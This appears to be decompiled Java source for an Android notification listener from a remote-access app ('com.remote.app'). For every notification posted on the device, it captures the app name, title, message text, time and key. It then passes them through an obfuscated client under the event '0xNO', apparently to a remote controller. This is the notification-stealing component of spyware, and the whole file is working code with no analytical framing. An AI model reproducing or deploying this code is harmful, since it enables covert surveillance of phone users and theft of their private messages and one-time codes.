package com.remote.app;

import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import e.h;
import org.json.JSONException;
import org.json.JSONObject;

public class NotificationListener extends NotificationListenerService {
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        try {
            String a2 = statusBarNotification.getPackageName();
            String string = statusBarNotification.getNotification().extras.getString("android.title");
            CharSequence charSequence = statusBarNotification.getNotification().extras.getCharSequence("android.text");
            String charSequence2 = charSequence != null ? charSequence.toString() : "";
            long a3 = statusBarNotification.getPostTime();
            String a4 = statusBarNotification.getKey();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("appName", a2);
            jSONObject.put("title", string);
            jSONObject.put("content", "" + charSequence2);
            jSONObject.put("postTime", a3);
            jSONObject.put("key", a4);
            h.a(AppClass.f202a).b().a("0xNO", jSONObject);
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
    }
}
